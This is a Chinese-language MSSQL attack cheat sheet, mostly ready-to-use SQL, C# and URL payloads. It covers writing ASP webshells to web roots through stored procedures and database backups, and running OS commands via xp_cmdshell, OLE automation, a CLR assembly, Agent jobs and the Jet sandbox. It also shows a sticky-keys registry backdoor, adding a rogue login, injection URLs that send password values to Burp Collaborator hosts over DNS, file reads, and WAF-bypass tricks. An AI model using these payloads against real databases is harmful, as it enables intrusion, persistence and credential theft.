- [Basic](#basic)
  - [基础查询](#基础查询)
    - [数据库确定](#数据库确定)
    - [版本](#版本)
    - [权限](#权限)
    - [站库分离](#站库分离)
    - [获取数据库](#获取数据库)
    - [数据表](#数据表)
    - [搜索含关键字的表,列](#搜索含关键字的表列)
    - [获取网站绝对路径](#获取网站绝对路径)
    - [查看xx数据库连接的IP](#查看xx数据库连接的ip)
    - [xx 库中所有字段名带 pass|pwd 的表](#xx-库中所有字段名带-passpwd-的表)
  - [GetWebShell](#getwebshell)
    - [存储过程写文件](#存储过程写文件)
      - [利用条件](#利用条件)
    - [差异备份GetShell](#差异备份getshell)
    - [日志备份GetShell](#日志备份getshell)
- [进阶利用](#进阶利用)
  - [xp\_dirtree](#xp_dirtree)
  - [sp\_oacreate](#sp_oacreate)
  - [xp\_cmdshell](#xp_cmdshell)
  - [Ole automation procedures](#ole-automation-procedures)
  - [ap\_addlogin添加用户](#ap_addlogin添加用户)
  - [xp\_regwrite劫持粘滞键](#xp_regwrite劫持粘滞键)
  - [CLR执行命令](#clr执行命令)
    - [创建sql文件](#创建sql文件)
    - [C#代码](#c代码)
    - [获取sql语句](#获取sql语句)
    - [开启CLR配置](#开启clr配置)
    - [导入程序集](#导入程序集)
    - [创建存储过程](#创建存储过程)
    - [执行命令](#执行命令)
  - [Agent Job代理作业](#agent-job代理作业)
  - [沙盒执行命令](#沙盒执行命令)
      - [利用条件](#利用条件-1)
- [Some Tricks](#some-tricks)
  - [DNS带外](#dns带外)
    - [fn\_xe\_file\_target\_read\_file()](#fn_xe_file_target_read_file)
    - [fn\_get\_audit\_file()](#fn_get_audit_file)
    - [fn\_trace\_gettable()](#fn_trace_gettable)
  - [替换报错表达式](#替换报错表达式)
  - [获取存储过程执行结果,查询配置是否开启](#获取存储过程执行结果查询配置是否开启)
  - [格式化数据](#格式化数据)
    - [for json](#for-json)
  - [读取本地文件](#读取本地文件)
    - [OpenRowset()](#openrowset)
  - [爆出当前SQL语句](#爆出当前sql语句)
  - [BypassWAF](#bypasswaf)
# Basic

## 基础查询

### 数据库确定

`select 1/iif((select count(*) from sysobjects )>0,1,0)`

### 版本

`select @@version`
`select 1/iif(SUBSTRING(@@version,22,4)='2014',1,0)`

### 权限

`select IS_SRVROLEMEMBER('sysadmin'));--`

### 站库分离

`select @@SERVERNAME`
`select host_name()`
### 获取数据库
当前数据库: `select db_name()`
获取全部数据库:`select name from master..sysdatabases for xml path`
### 数据表
获取用户表:`select * from sysobjects where xtype='U'`
获取所以用户表`select name from sysobjects where xtype='U' from xml path`

### 搜索含关键字的表,列
`select table_name from information_schema.tables where table_name like '%pass%'`
`select column_name,table_name from information_schema.columns where column_name like '%pass%'`

### 获取网站绝对路径
```cmd
高权限启动2005或者2008
C:\Windows\system32\inetsrv\metabase.xml        #iis6
C:\Windows\System32\inetsrv\config\applicationHost.config       #iis7

DIR命令寻找路径
ir/s/b c:\index.aspx
/s      #列出所有子目录下的文件和文件夹
/b      #只列出路径和文件名，别的属性全部不显示

循环盘符
for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\sql.aspx)
```
### 查看xx数据库连接的IP

```sql
select DISTINCT client_net_address,local_net_address from sys.dm_exec_connections where Session_id IN (select session_id from sys.dm_exec_Sessions where host_name IN (SELECT hostname FROM master.dbo.sysprocesses WHERE DB_NAME(dbid) = 'xx'));
```

### xx 库中所有字段名带 pass|pwd 的表

```sql
select [name] from [xx].[dbo].sysobjects where id in(select id from [xx].[dbo].syscolumns Where name like '%pass%' or name like '%pwd%')
```



## GetWebShell

### 存储过程写文件

#### 利用条件

- 拥有DBA权限
- 知道的网站绝对路径

```mysql
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'C:\xxxx\www\test.asp', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'
```

### 差异备份GetShell
```sql
backup database web to disk = 'c:\www\index.bak'
create table test(cmd image)
insert into test(cmd) values (0x3C25657865637574652872657175657374282261222929253E)
backup database web to disk = 'c:\www\index.asp' with DIFFERENTIAL,FORMAT
```
### 日志备份GetShell
```sql
alter database web set RECOVERY FULL
create table cmd (a image)
backup database web to disk = 'c:\\www\a.sql'
backup log web to disk = 'c:\www\index1.sql' with init
insert into cmd(a) values('<%execute(request("go"))%>')
backup log web to disk = 'c:\www\shell.asp'
```

# 进阶利用

## xp_dirtree
xp_dirtree有三个参数，
要列的目录
是否要列出子目录下的所有文件和文件夹，默认为0，如果不需要设置为1
是否需要列出文件，默认为不列，如果需要列文件设置为1

```sql
xp_dirtree 'c:\', 1, 1      #列出当前目录下所有的文件和文件夹
```
## sp_oacreate
sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。
```sql
#判断sp_oacreate状态
select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
#开启sp_oacreate  
exec sp_configure 'show advanced options', 1;RECONFIGURE
exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE
```
```sql
#执行命令
declare @o int;
exec sp_oacreate 'wscript.shell',@o out;
exec sp_oamethod @o,'run',null,'cmd /c mkdir c:\temp';
exec sp_oamethod @o,'run',null,'cmd /c "net user" > c:\temp\user.txt';
create table cmd_output (output text);
BULK INSERT cmd_output FROM 'c:\temp\user.txt' WITH (FIELDTERMINATOR='n',ROWTERMINATOR = 'nn')      -- 括号里面两个参数是行和列的分隔符，随便写就行
select * from cmd_output
```
## xp_cmdshell

**利用条件:**

* 拥有DBA权限 `select is_srvrolemember('sysadmin');`

```sql
exec sp_configure 'show advanced options',1  
reconfigure;exec sp_configure 'xp_cmdshell',1;
reconfigure
```
被删除后，重新添加xp``_cmdshell存储过程语句
```sql
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int;
sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll';
```
## Ole automation procedures
**利用条件:**

- 拥有DBA权限

1. 开启Ole automation procedures

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;
```

2. 命令执行

```sql

# wscript.shell组件
declare @luan int,@exec int,@text int,@str varchar(8000)
exec sp_oacreate 'wscript.shell',@luan output
exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
exec sp_oamethod @exec, 'StdOut', @text out
exec sp_oamethod @text, 'readall', @str out
select @str;

# com组件
declare @luan int,@exec int,@text int,@str varchar(8000)
exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output
exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
exec sp_oamethod @exec, 'StdOut', @text out
exec sp_oamethod @text, 'readall', @str out
select @str;
```
## ap_addlogin添加用户
```sql
EXEC sp_addlogin 'Admin', 'test123', 'master'
# 用户Admin，密码test123，默认数据库master
```
## xp_regwrite劫持粘滞键
```sql
#sp_oacreate复制文件
exec sp_configure 'show advanced options', 1;RECONFIGURE
exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\cmd.exe' ,'c:\windows\system32\sethc.exe';
exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.EXE','Debugger','REG_SZ','c:\windows\system32\cmd.exe';
```
## CLR执行命令
SQLServer 2005以后支持调用CLR(公告语言运行时)的存储过程,即支持在sqlserver中运行.net代码.
### 创建sql文件
勾选创建sql文件,选3.5Net 兼容性更好
![CLR1.png](https://cdn.nlark.com/yuque/0/2                                                                                  021/png/12610959/1628249622336-34f54dea-5aae-4584-a80c-eeff2f1d3f01.png#clientId=ua0a461ef-7c4c-4&from=drop&id=u8a58121a&margin=%5Bobject%20Object%5D&name=CLR1.png&originHeight=561&originWidth=1027&originalType=binary&ratio=1&size=19411&status=done&style=none&taskId=u1c032984-9062-480c-a90b-156643f0370)
![CLR2.png](https://cdn.nlark.com/yuque/0/2021/png/12610959/1628249599733-28ca397f-9873-4afe-8c0d-2f4171e28f6f.png#clientId=ua0a461ef-7c4c-4&from=drop&id=u85da9149&margin=%5Bobject%20Object%5D&name=CLR2.png&originHeight=752&originWidth=677&originalType=binary&ratio=1&size=17434&status=done&style=none&taskId=uf31ac0c7-d7e7-492f-8589-212abb76628)
### C#代码
```c
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Text;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void Runexec (string cmd)
    {
        // 在此处放置代码
        SqlContext.Pipe.Send("Running command");
        SqlContext.Pipe.Send(Runcommand("cmd.exe", " /c " + cmd));
    }
    public static string Runcommand(string bin,string command)
    {
        //启动一个进程
        var process = new Process();
        process.StartInfo.FileName = bin;
        if (!string.IsNullOrEmpty(command))
        {
            //进程名称
            process.StartInfo.Arguments = command;
        }
        //设置进程属性
        process.StartInfo.CreateNoWindow = true;//无窗口
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;//通过将此属性设置为， false 可以重定向输入、输出和错误流
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }
        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();
            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }
            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(bin + command + " finished with exit code = " + process.ExitCode + ": " + message);
        }
        return stdOutput.ToString();
    }
}
```
### 获取sql语句
在生成的sql文件中得到字节流的创建语句
```sql
CREATE ASSEMBLY [CLRS]
    AUTHORIZATION [dbo]
    FROM 0x4D5A9000030000...
    ...
    WITH PERMISSION_SET = UNSAFE;
```
### 开启CLR配置
```sql
//开启CLR
sp_configure 'clr enabled', 1
GO
RECONFIGURE
GO
//将数据库标记为可信
ALTER DATABASE master SET TRUSTWORTHY ON;
```
### 导入程序集
```sql
CREATE ASSEMBLY [CLRS]
    AUTHORIZATION [dbo]
    FROM 0x4D5A90000300000004000000FFFF0000B8000000000000004000000000000000000000000000000000000000000000000000000000020000008000000000000000000000
    ...
    ...
    WITH PERMISSION_SET = UNSAFE;
```
### 创建存储过程
```sql
CREATE PROCEDURE [dbo].[runningexec]
@cmd NVARCHAR (MAX)
AS EXTERNAL NAME [CLRS].[StoredProcedures].[Runexec]
go
```
### 执行命令
```
exec dbo.runningexec 'whoami'`

Running command
nt service\mssql$sqlexpress
nt service\mssql$sqlexpress
```
## Agent Job代理作业
1. 目标服务器必须开启了MSSQL Server代理服务；
1. 服务器中当前运行的用户账号必须拥有足够的权限去创建并执行代理作业；
```sql
exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT';//开启Agent Job
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ;
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe calc.exe', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';
```
## 沙盒执行命令

#### 利用条件

- 拥有DBA权限
- sqlserver服务权限为system
- 服务器拥有jet.oledb.4.0驱动

沙盒提权的原理就是jet.oledb（修改注册表）执行系统命令。数据库通过查询方式调用mdb文件，执行参数，绕过系统本身自己的执行命令，实现mdb文件执行命令

```sql
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0/关闭沙盒

select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
```

# Some Tricks

[原文](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
Payloads Test On MSSQL 2019、2017、2016SP2。

## DNS带外
`fn_xe_file_target_read_file()`,`fn_get_audit_file()`, `fn_trace_gettable()`

### fn_xe_file_target_read_file()

`https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))`
**权限**：在服务器上需要“VIEW SERVER STATE”权限。

### fn_get_audit_file()
`https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))`
**权限**：需要CONTROL SERVER权限
### fn_trace_gettable()
`https://vuln.app/getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))`
**权限**：需要CONTROL SERVER权限

## 替换报错表达式

以下函数会触发类型错误
- SUSER_NAME()
- USER_NAME()
- PERMISSIONS()
- DB_NAME()
- FILE_NAME()
- TYPE_NAME()
- COL_NAME()
ORI:`https://vuln.app/getItem?id=1'+AND+1=@@version--`
New:`https://vuln.app/getItem?id=1'%2buser_name(@@version)--`

## 获取存储过程执行结果,查询配置是否开启

1. 创建一个具有相同类型字段的表
1. 执行存储过程将结果插入创建表中
1. 从表中查询对应结果
```sql
--查询配置
drop table mdconfig;create table mdconfig(a varchar(max),b int,c int,d int,e int)
insert mdconfig exec sp_configure
select b from mdconfig where a = 'xp_cmdshell'

--xp_cmdshell结果
drop table md32;create table md32(a varchar(max))
insert md32 exec xp_cmdshell 'whoami'
select a from md32
```
## 格式化数据

- for xml  需要指定模式(手动添加根节点)
- for json
### for json
**联合查询:**
`https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--`


**报错注入:**(基于错误的向量需要别名或名称，因为不能将两者的表达式输出格式化为JSON。)
`https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--`
## 读取本地文件
### OpenRowset()
```sql
--开启OpenRowSet()
exec sp_configure 'show advanced options',1
reconfigure
exec sp_configure 'Ad Hoc Distributed Queries',1
reconfigure
```
```sql
--OpenRowset()
select * from OpenRowset('sqloledb','server=aaaa.dnslog.cn;uid=sa;pwd=sa','')
```
**联合查询:**  
`https://vuln.app/getItem?id=-1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null`  
**报错注入:**  
`https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--`  

**权限:** BULK选项需要ADMINISTER BULK OPERATIONS或ADMINISTER DATABASE BULK OPERATIONS权限。

## 爆出当前SQL语句
当前执行的SQL语句可以从`sys.dm_exec_requests`和 `sys.dm_exec_sql_text`中查询
`https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null`  

**权限**：如果用户在服务器上具有“查看服务器状态”权限，则该用户将在SQL Server实例上看到所有正在执行的会话；否则，用户将仅看到当前会话。
## BypassWAF
1. 非标准的空白字符：%C2%85 или %C2%A0,空白字符: 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
[https://vuln.app/getItem?id=1unionselect null,@@version,null--](https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--)
2. 科学（0e）和十六进制（0x）表示法，用于混淆UNION：
[https://vuln.app/getItem?id=0eunion+select+null,@@version,null--](https://vuln.app/getItem?id=0eunion+select+null,@@version,null--)
[https://vuln.app/getItem?id=0xunion+select+null,@@version,null--](https://vuln.app/getItem?id=0xunion+select+null,@@version,null--)
3. 在FROM和列名之间用点代替空格：
[https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--](https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--)
4. SELECT和一次性列之间的\N分隔符：
[https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--](https://vuln.app/getItem?id=0xunion+select%5CNnull,@@version,null+from+users--)
5. IIS+sqlserver: IBM 编码bypass

```http
POST /test/a.aspx?%C8%85%93%93%96%E6%96%99%93%84= HTTP/1.1 
Host: target 
User-Agent: UP foobar 
//Content-Type: application/x-www-form-urlencoded; charset=ibm037
x-up-devcap-post-charset: ibm500 或者ibm037
Content-Length: 40 

%89%95%97%A4%A3%F1=%A7%A7%A7%A7%A7%A7%A7


1.添加HTTP头 x-up-devcap-post-charset来表明使用的字符集，代替charset字段  
2.添加UserAgent： UP xxx  
3.参数键值都要编码  
```
6. 百分号%:在ASP+IIS时,单独的%会被忽略,绕过关键字,`sel%ect * from admin`.
7. %u:asp+iis,aspx+iis,对关键字的某个字符进行Unicode编码.
